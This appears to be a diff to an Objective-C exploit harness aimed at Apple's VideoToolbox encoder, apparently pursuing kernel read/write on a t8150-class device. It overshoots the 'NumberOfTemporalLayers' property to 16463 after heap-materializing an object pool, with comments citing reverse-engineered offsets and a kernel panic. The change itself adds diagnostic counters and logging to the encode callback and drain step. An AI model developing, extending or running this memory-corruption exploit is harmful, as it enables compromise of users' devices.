@@ -47,7 +47,7 @@
 #import <unistd.h>
 #import <errno.h>
 
-#define P149_BUILD     @"p149-t8150krw-v4"
+#define P149_BUILD     @"p149-t8150krw-v4.1"
 #define P149_KEY       @"NumberOfTemporalLayers"
 #define P149_PRE       8
 #define P149_OVER      16463
@@ -64,6 +64,10 @@ static NSMutableString *g_buf; static int g_fd = -1;
    ctx+0x147b0 == 1 and making the later invalidate the this=1 FAR=0x59
    panic. Only a delivered sample buffer proves the pool is heap-backed. */
 static volatile int g_p149_frames;
+static volatile int g_p149_calls;
+static volatile int g_p149_dropped;
+static volatile OSStatus g_p149_last_status;
+static volatile VTEncodeInfoFlags g_p149_last_info;
 static void L(NSString *s) {
     if (!g_buf) return;
     NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
@@ -78,7 +82,11 @@ static NSString *P149R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r
 static void p149_flushCB(void *_Nullable refCon, void *_Nullable e,
                          OSStatus status, VTEncodeInfoFlags info,
                          CMSampleBufferRef _Nullable sb) {
-    (void)refCon; (void)e; (void)status; (void)info;
+    (void)refCon; (void)e;
+    g_p149_calls++;
+    g_p149_last_status = status;
+    g_p149_last_info = info;
+    if (info & kVTEncodeInfo_FrameDropped) g_p149_dropped++;
     if (sb) g_p149_frames++;
 }
 
@@ -265,6 +273,9 @@ static long p149_layers_knob(NSString *docs) {
         free(page);
         p149_bandit("nopb"); return P149R();
     }
+    IOSurfaceRef pbSurf = CVPixelBufferGetIOSurface(pb);
+    Lf(@"[2b2] source pixel buffer IOSurface=%p (NULL = not IOSurface-backed)",
+       pbSurf);
 
     /* v7: encode AT N=8 first so FUN_8790cec kalloc+ctor stores a heap
        this at ctx+0x147b0. v6 Set-16463-then-encode left this=1.
@@ -273,6 +284,10 @@ static long p149_layers_knob(NSString *docs) {
        overshoot. Encoding returning 0 is NOT materialization. */
     OSStatus firstSt = 0;
     g_p149_frames = 0;
+    g_p149_calls = 0;
+    g_p149_dropped = 0;
+    g_p149_last_status = 0;
+    g_p149_last_info = 0;
     for (int i = 0; i < 2; i++) {
         VTEncodeInfoFlags flags = 0;
         OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
@@ -282,8 +297,9 @@ static long p149_layers_knob(NSString *docs) {
     }
     Lf(@"[2e] ENCODE N=%ld (materialize pool) first st=%d", pre, (int)firstSt);
     OSStatus drainSt = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
-    Lf(@"[2e] materialize drain st=%d frames=%d (a delivered sample = heap this)",
-       (int)drainSt, g_p149_frames);
+    Lf(@"[2e] materialize drain st=%d frames=%d calls=%d dropped=%d lastStatus=%d lastInfo=0x%x (a delivered sample = heap this)",
+       (int)drainSt, g_p149_frames, g_p149_calls, g_p149_dropped,
+       (int)g_p149_last_status, (unsigned)g_p149_last_info);
     BOOL materialized = (firstSt == 0 && g_p149_frames > 0);
     if (!materialized) {
         L(@"[2e] MATERIALIZE FAILED — overshoot SKIPPED.");
